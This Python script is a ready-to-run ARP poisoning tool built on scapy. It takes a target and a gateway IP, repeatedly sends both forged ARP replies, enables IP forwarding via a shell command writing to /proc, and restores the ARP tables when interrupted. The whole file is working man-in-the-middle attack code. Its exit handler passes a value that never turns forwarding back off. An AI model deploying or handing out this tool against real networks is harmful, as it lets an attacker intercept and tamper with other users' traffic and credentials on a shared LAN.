#!/usr/bin/env python 3.7.2
# -*- coding: utf-8 -*-

import scapy.all as scapy
import time
import argparse
from termcolor import colored
import os


class ArpSpoof():
    def __init__(self):
        self.sent_packet_count = 0
        self.about()
        self.script_desc()

    def get_arguments(self):
        parser = argparse.ArgumentParser(description=self.description, epilog=self.usage, prog=self.program, formatter_class=argparse.RawTextHelpFormatter)
        parser.add_argument("--target", dest="targetIP", help="Target machine IP address")
        parser.add_argument("--gateway", dest="gatewayIP", help="Gateway IP address")
        options = parser.parse_args()
        if not options.targetIP:
            parser.error('[-] Please specify a target, use --help for more info.')
        elif not options.gatewayIP:
            parser.error('[-] Please specify a gateway (default gateway), use --help for more info.')
        else:
            return options

    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc

    def spoof(self, target_ip, gateway_ip):
        target_mac = self.get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        scapy.send(packet, verbose=False)

    def send_packet(self, targetIP, gatewayIP):
        while True:
            self.spoof(targetIP, gatewayIP)
            self.spoof(gatewayIP, targetIP)
            self.sent_packet_count += 2
            print(colored("\r[+] Sent packet count: " + str(self.sent_packet_count), "green"), end="")
            time.sleep(2)

    def restore(self, target_ip, gateway_ip):
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        scapy.send(packet, verbose=False, count=4)

    def ip_forward(self, value):
        if value == 1:
            os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        elif value == 2:
            os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

    def script_desc(self):
        self.program = "arp_spoof"
        self.usage = """Usage: python arp_spoof.py --target TARGETIP --gateway GATEWAY\nExample usage: python arp_spoof.py --target 10.0.2.15 --gateway 10.0.2.1"""
        self.description = "This script is used to perform ARP poisoning on a target machine in the same network."

    def about(self):
        print(colored("    _    ____  ____    ____  ____   ___   ___  _____ _____ ____  ", "green"))
        print(colored("   / \\  |  _ \\|  _ \\  / ___||  _ \\ / _ \\ / _ \\|  ___| ____|  _ \\ ", "green"))
        print(colored("  / _ \\ | |_) | |_) | \\___ \\| |_) | | | | | | | |_  |  _| | |_) |", "green"))
        print(colored(" / ___ \\|  _ <|  __/   ___) |  __/| |_| | |_| |  _| | |___|  _ < ", "green"))
        print(colored("/_/   \\_\\_| \\_\\_|     |____/|_|    \\___/ \\___/|_|   |_____|_| \\_ ", "green"))

    def keyboardinterrupt_message(self):
        print(colored("\n[-] CTRL+C pressed. Resetting ARP tables... Please wait...", "red"))
        print(colored("[-] Exiting the application!", "red"))


try:
    arpSpoof = ArpSpoof()
    arpSpoof.ip_forward(1)
    options = arpSpoof.get_arguments()
    arpSpoof.send_packet(options.targetIP, options.gatewayIP)
except KeyboardInterrupt:
    arpSpoof.keyboardinterrupt_message()
    arpSpoof.ip_forward(0)
    arpSpoof.restore(options.targetIP, options.gatewayIP)